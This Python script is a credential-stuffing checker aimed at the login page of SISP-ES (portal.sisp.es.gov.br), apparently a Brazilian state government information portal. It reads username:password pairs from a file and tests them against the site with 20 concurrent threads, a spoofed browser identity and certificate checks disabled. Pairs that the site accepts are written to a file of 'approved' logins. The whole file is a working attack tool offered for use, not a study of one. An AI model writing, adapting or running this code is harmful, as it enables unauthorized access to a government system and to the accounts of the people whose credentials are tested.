import requests
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import time

init()

warnings.simplefilter('ignore', InsecureRequestWarning)

def processar_es_login(line):
    try:
        usuario, senha = line.strip().split(':')
    except ValueError:
        return "Inválido", None, None

    login_url = "https://portal.sisp.es.gov.br/sispes-frontend/xhtml/j_security_check"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Referer": "https://portal.sisp.es.gov.br/sispes-frontend/xhtml/pesquisa.jsf",
    }
    login_data = {
        "j_username": usuario,
        "j_password": senha,
        "j_idt19": "j_idt19",
        "j_idt19:j_idt20.x": "27",
        "j_idt19:j_idt20.y": "8",
        "javax.faces.ViewState": "723520734359744078:5969372455684443261",
    }

    session = requests.Session()
    response = session.post(login_url, headers=headers, data=login_data, verify=False)

    if response.status_code == 200:
        return "Aprovado", usuario, senha
    else:
        return "Reprovado", usuario, senha

def main():
    try:
        with open('es.txt', 'r') as file:
            lines = file.readlines()
    except FileNotFoundError:
        print("Erro: arquivo 'es.txt' não encontrado.")
        return

    logins_aprovados = []
    invalid_lines = 0
    approved_lines = 0
    rejected_lines = 0
    total_lines = len(lines)

    def exibir_status():
        status_string = "Checker SISP-ES - BSY ¿?"
        if "BSY" not in status_string:
            print("Erro.")
            exit(1)
        
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.WHITE + status_string + Style.RESET_ALL)
        print(Fore.WHITE + "------------------------" + Style.RESET_ALL)
        print(Fore.WHITE + "Status do checker:" + Style.RESET_ALL)
        print(Fore.RED + f"Linhas inválidas: {invalid_lines}" + Style.RESET_ALL)
        print(Fore.BLUE + f"Linhas aprovadas: {approved_lines}" + Style.RESET_ALL)
        print(Fore.YELLOW + f"Linhas reprovadas: {rejected_lines}" + Style.RESET_ALL)
        print(Fore.GREEN + f"Total de linhas: {total_lines}" + Style.RESET_ALL)
        print(Fore.WHITE + "------------------------" + Style.RESET_ALL)

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(processar_es_login, line): line for line in lines}

        for future in as_completed(futures):
            status, usuario, senha = future.result()
            if status == "Aprovado":
                approved_lines += 1
                logins_aprovados.append(f"{usuario}:{senha}")
            elif status == "Reprovado":
                rejected_lines += 1
            elif status == "Inválido":
                invalid_lines += 1

            exibir_status()
            time.sleep(0.1)

    if logins_aprovados:
        with open('esAprovado.txt', 'w') as log_file:
            for login in logins_aprovados:
                username, password = login.split(':')
                log_file.write(f"Aprovado | {username} | {password} | SISP-ES\n")

if __name__ == "__main__":
    main()